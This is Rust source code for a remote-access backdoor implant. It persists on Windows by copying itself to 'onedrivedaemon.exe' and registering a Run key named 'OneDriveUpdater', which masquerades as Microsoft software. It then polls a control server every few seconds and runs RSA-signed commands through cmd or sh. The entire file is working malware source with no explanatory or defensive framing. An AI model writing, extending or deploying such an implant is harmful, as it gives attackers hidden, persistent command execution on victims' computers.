use directories::UserDirs;
use rsa::pkcs1::DecodeRsaPublicKey;
use rsa::pkcs1v15::{Signature, VerifyingKey};
use rsa::sha2::{Digest, Sha256};
use rsa::signature::Verifier;
use rsa::RsaPublicKey;
use std::env;
use std::error::Error;
use std::path::Path;
use std::process::Command;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::time::{sleep, Duration};
use winreg::enums::*;
use winreg::RegKey;

const CONTROL: &str = "127.0.0.1:8080";
const RSA_PUB_PEM: &str = "-----BEGIN RSA PUBLIC KEY-----
MIIBCgKCAQEA1KBXWBk/GxsfTWhKTSUp7SB/M+cE9vQHVYaeRgtzN4t430JbmUbU
3bMVusTc5FzE659d7JFpFmEV1jQuuscwarBtG4LTsgRzm/WntGlXLXqCLlr/lka0
1f5Lc+myAWj+fVGmFJArC20cdo2KEJXVnQnm9VYzUI0yz9Y0lyvBJYCoYqoXmX+Z
JE6D/VrgZY5XSmeiDUeV5W8+wFUj7VE89B9agzKXjz3K1xUsrz7Q5Ri9XQ+F7ouL
ghP0P975jWSP2sHbRdtXSei7zb4baGOiOe/7mH1/xUSGmxyHuQlc0haOGUXC7jxT
2jefOObS8Jry+lGlMMYpWSa5YazWBF+wnwIDAQAB
-----END RSA PUBLIC KEY-----";

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    get_persistence().await;

    let public_key = RsaPublicKey::from_pkcs1_pem(RSA_PUB_PEM).unwrap();
    let verify_key = VerifyingKey::<Sha256>::new(public_key);

    let mut previous_command = String::from("");

    loop {
        // Sleep beginning of loop
        sleep(Duration::from_millis(5000)).await;

        let mut stream = get_stream().await;
        let (mut reader, mut writer) = stream.split();
        if let Err(_) = writer.write_all(b"Hello!").await {
            writer.shutdown().await;
            continue;
        }

        let mut buf = vec![0u8; 1024];

        // Message

        let message_length = match reader.read_exact(&mut buf).await {
            Ok(n) => n,
            Err(_) => {
                writer.shutdown().await;
                continue;
            }
        };

        // Signed Message

        let mut signature_buf = vec![0u8; 256];

        if let Err(_) = reader.read(&mut signature_buf).await {
            writer.shutdown().await;
        }

        let signature =
            Signature::try_from(&signature_buf[..]).expect("Failed to get signature from bytes");

        if let Err(e) = verify_key.verify(&buf[..message_length], &signature) {
            eprintln!("{}", e);
            continue;
        }

        let command = match String::from_utf8(buf) {
            Ok(c) => c,
            Err(_) => continue,
        };

        let command = command.trim_matches(char::from(0));

        if previous_command == command {
            continue;
        } else {
            previous_command = command.to_string();
        }

        println!("Message from control: {}", &command[..]);

        handle_command(&command).await;

        writer.shutdown().await;
    }
}

async fn get_stream() -> TcpStream {
    loop {
        match TcpStream::connect(CONTROL).await {
            Ok(s) => return s,
            Err(_) => {
                sleep(Duration::from_millis(5000));
            }
        }
    }
}

async fn handle_command(command: &str) {
    let (command, args) = match command.split_once(" ") {
        Some((c, a)) => (c, a),
        None => (&command[..], ""),
    };

    match command {
        "cmd" => {
            println!("Command running!");
            if cfg!(target_os = "windows") {
                Command::new("cmd")
                    .args(["/C", args])
                    .spawn()
                    .expect("Command err");
            } else {
                Command::new("sh")
                    .arg("-c")
                    .arg(args)
                    .spawn()
                    .expect("Command err");
            }
        }
        &_ => (),
    }
}

async fn get_persistence() {
    if cfg!(target_os = "windows") {
        // Makes an autostart registry key
        let hkcu = RegKey::predef(HKEY_CURRENT_USER);
        let path = Path::new("Software")
            .join("Microsoft")
            .join("Windows")
            .join("CurrentVersion")
            .join("Run");
        let (key, _disp) = hkcu.create_subkey(&path).unwrap();

        let name;
        if let Some(n) = env::args().next() {
            name = n;
        } else {
            return;
        }

        let userdirs;
        if let Some(u) = UserDirs::new() {
            userdirs = u;
        } else {
            eprintln!("Failed to get userdir");
            return;
        }

        let mut newdir = userdirs.home_dir().join("onedrivedaemon");
        newdir.set_extension("exe");

        let _ = std::fs::copy(&name, &newdir);

        let os_string = newdir.into_os_string();
        if let Err(_) = key.set_value("OneDriveUpdater", &os_string) {
            return;
        }
    }
}
